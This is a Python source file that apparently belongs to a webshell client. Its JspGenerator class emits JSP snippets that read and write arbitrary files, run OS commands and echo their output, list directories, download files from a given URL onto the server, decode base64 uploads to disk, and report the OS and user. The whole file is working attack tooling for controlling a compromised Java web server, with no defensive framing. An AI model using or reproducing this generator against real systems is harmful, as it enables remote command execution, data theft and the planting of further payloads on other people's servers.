"""JSP/Java code generator for webshell operations."""


class JspGenerator:
    """Generate JSP code for webshell operations."""

    @staticmethod
    def read_file(file_path: str, encoding: str = "utf-8") -> str:
        """Generate JSP code to read file."""
        return f"""String content = new String(java.nio.file.Files.readAllBytes(
    java.nio.file.Paths.get("{file_path}")), "{encoding}");
out.print(content);"""

    @staticmethod
    def write_file(file_path: str, content: str, encoding: str = "utf-8") -> str:
        """Generate JSP code to write file."""
        return f"""java.nio.file.Files.write(
    java.nio.file.Paths.get("{file_path}"),
    "{content}".getBytes("{encoding}"))"""

    @staticmethod
    def run_command(command: str, capture_output: bool = True) -> str:
        """Generate JSP code to execute command."""
        if capture_output:
            return f"""Process p = Runtime.getRuntime().exec("{command}");
java.io.BufferedReader br = new java.io.BufferedReader(
    new java.io.InputStreamReader(p.getInputStream()));
String line; while((line=br.readLine())!=null){{out.println(line);}}"""
        else:
            return f'Runtime.getRuntime().exec("{command}")'

    @staticmethod
    def list_directory(directory: str = ".") -> str:
        """Generate JSP code to list directory."""
        return f"""java.io.File dir = new java.io.File("{directory}");
for(String name : dir.list()){{out.println(name);}}"""

    @staticmethod
    def download_file(url: str, save_path: str) -> str:
        """Generate JSP code to download file."""
        return f"""java.net.URL url = new java.net.URL("{url}");
java.nio.channels.ReadableByteChannel rbc = java.nio.channels.Channels.newChannel(url.openStream());
java.io.FileOutputStream fos = new java.io.FileOutputStream("{save_path}");
fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
fos.close();"""

    @staticmethod
    def upload_file(file_path: str, content: str) -> str:
        """Generate JSP code to upload file (base64 content)."""
        return f"""byte[] data = java.util.Base64.getDecoder().decode("{content}");
java.nio.file.Files.write(java.nio.file.Paths.get("{file_path}"), data);"""

    @staticmethod
    def get_system_info() -> str:
        """Generate JSP code to get system info."""
        return """out.println("OS: " + System.getProperty("os.name"));
out.println("User: " + System.getProperty("user.name"));
out.println("Dir: " + System.getProperty("user.dir"));"""
